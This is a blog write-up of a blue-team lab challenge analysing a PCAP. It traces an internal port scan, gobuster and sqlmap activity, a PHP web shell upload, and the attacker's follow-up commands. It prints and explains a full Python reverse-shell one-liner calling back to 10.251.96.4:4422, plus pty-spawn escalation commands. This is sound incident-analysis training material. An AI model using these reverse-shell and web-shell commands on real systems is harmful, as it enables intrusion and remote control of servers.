---
draft: false
author: ladybuginthemug
title: Network Analysis – Web Shell
description: The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. 
date: 2024-01-06
category:
  - blueteamlabs
---

[Network Analysis – Web Shell
](https://blueteamlabs.online/home/challenge/network-analysis-web-shell-d4d3a2821b)

>Scenario
>
>The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.

My usual approach is to move back and forth from general statistics to a close-up investigation of streams. 

#### PORT SCANNING 

So I would start with **Statistics** -> **Endpoints** -> **TCP**.  By sorting ports we can instantly identify port incrementation which is an indication of the port scanning.

![ports-last](https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/64ed0c5d-ed6f-4bb3-ad10-a3d81182d0c5)


The stream reveals that `10.251.96.4` is the IP responsible for conducting the `TCP SYN` port scan activity in the port range of `1-1024`

![TCPSYNscan](https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/5c3f9638-fb2e-40e2-af00-aaf537610f87)


Surly enough we would be able to find more automation tools around. Simple search for user agents with `tshark` :

```bash
└─$ tshark -r BTLOPortScan.pcap -Y "http.user_agent" -T fields -e http.user_agent | sort -u

Apache/2.4.29 (Ubuntu) (internal dummy connection)
gobuster/3.0.1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
sqlmap/1.4.7#stable (http://sqlmap.org)

```
It will reveal the tools used which are `Gobuster 3.0.1`


![gobuster](https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/c2578128-05ad-4ecb-be9d-5fc636077665)


and `sqlmap 1.4.7`


![sql](https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/12fab041-a8b6-46f6-a133-08a75a89bd0b)


---
#### FILE UPLOAD

**Export objects** -> **HTTP** 

![upload](https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/71bdf96f-fb65-420e-af04-7efa4d6273e1)

The attacker used `editprofile.php` to upload a web shell `dbfunctions.php`:  

```bash
"16102","2021-02-07 16:40:39.693318843","10.251.96.4","10.251.96.5","HTTP","1087","POST /upload.php HTTP/1.1  (application/x-php)"
"16106","2021-02-07 16:40:43.892078780","10.251.96.4","10.251.96.5","HTTP","433","GET /uploads/ HTTP/1.1 "
"16110","2021-02-07 16:40:43.925237417","10.251.96.4","10.251.96.5","HTTP","401","GET /icons/unknown.gif HTTP/1.1 "
"16115","2021-02-07 16:40:43.928118120","10.251.96.4","10.251.96.5","HTTP","400","GET /icons/image2.gif HTTP/1.1 "
"16121","2021-02-07 16:40:45.168306955","10.251.96.4","10.251.96.5","HTTP","486","GET /uploads/dbfunctions.php HTTP/1.1 "
```
![webshell](https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/49fdf490-a307-4820-a55d-1164ebff6bc9)

`GET /uploads/ HTTP/1.1` and response `HTTP/1.1 200 OK` with HTML of a simple directory listing page generated by an Apache web server - confirmed it :

```bash
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
....  processed HTML content ....

Title: Index of /uploads

Main Heading: Index of /uploads

[PARENTDIR]	Parent Directory	  -	 
	dbfunctions.php	2021-02-07 16:40	116	 
	myphoto.png	2021-02-07 16:38	7.1K	

Apache/2.4.29 (Ubuntu) Server at 10.251.96.5 Port 80

```

We can spot the first commands used in the web shell :

```bash
"16134","2021-02-07 16:40:51.125681644","10.251.96.4","10.251.96.5","HTTP","455","GET /uploads/dbfunctions.php?cmd=id HTTP/1.1 "
"16144","2021-02-07 16:40:56.263731727","10.251.96.4","10.251.96.5","HTTP","459","GET /uploads/dbfunctions.php?cmd=whoami HTTP/1.1 "
"16201","2021-02-07 16:42:35.675646891","10.251.96.4","10.251.96.5","HTTP","706","GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1 "
```

The last request is trying to exploit a vulnerability in the server by injecting a TCP-based Python reverse shell with connection to the specified IP and port in the following steps:

- Imports the socket, subprocess, and os modules.
```bash
python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
```
- Creates a socket and connects to the IP address 10.251.96.4 on port 4422.
```bash
s.connect(("10.251.96.4",4422));
```
- Duplicates the socket's file descriptor to the standard input (0), standard output (1), and standard error (2).
```bash
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
```
- When the code executes /bin/sh the shell inherits the redirections and communicates with the remote user via the socket 
```bash
p=subprocess.call(["/bin/sh","-i"]);
```

---

#### SHELL CONNECTION

![shell-python](https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/52058542-85ec-48c7-b96f-916ca5739572)


Following tcp stream on port 4422, we can confirm that the reverse shell connection is established. 

The attempts to escalate privileges appear to have been made by executing commands such as `python -c 'import pty; pty.spawn("/bin/bash")'` and `bash -i`. These commands are commonly used to attempt to gain a more interactive shell or elevate privileges.
However, there is no explicit indication in the log that these privilege escalation attempts were successful. The user continues to operate with the same username `www-data` and there are no indications of a change in privileges or access to restricted areas of the file system.
Not only that but also a malicious actor was not even able to clean up trails he left behind in the form of `dbfuncs.php`:

```bash
addcart.php  common.php     consts.php	 editprofile.php  info.php   upload.php
browse.php   complaint.php  dbfuncs.php  index.php	  login.php  uploads
www-data@bob-appserver:/var/www/html$ rrmm  ddbb	funcs.php 

rm: cannot remove 'dbfuncs.php': Operation not permitted
www-data@bob-appserver:/var/www/html$ llss

```

